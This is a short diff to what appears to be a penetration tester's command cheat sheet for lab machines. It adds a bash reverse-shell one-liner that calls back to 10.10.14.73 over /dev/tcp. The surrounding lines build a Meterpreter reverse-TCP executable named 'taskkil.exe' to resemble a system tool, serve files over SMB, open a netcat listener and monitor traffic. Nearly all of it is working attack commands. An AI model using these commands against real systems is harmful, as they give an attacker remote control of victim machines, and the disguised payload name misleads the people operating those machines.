@@ -234,6 +234,7 @@ python -m SimpleHTTPServer 80
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
 impacket-smbserver files `pwd`
 rlwrap nc -lvnp 51251
+bash -c "bash -i >& /dev/tcp/10.10.14.73/51251 0>&1"
 
 #monitor traffic to and from single host
 iptables -I INPUT 1 -s 10.11.1.227 -j ACCEPT
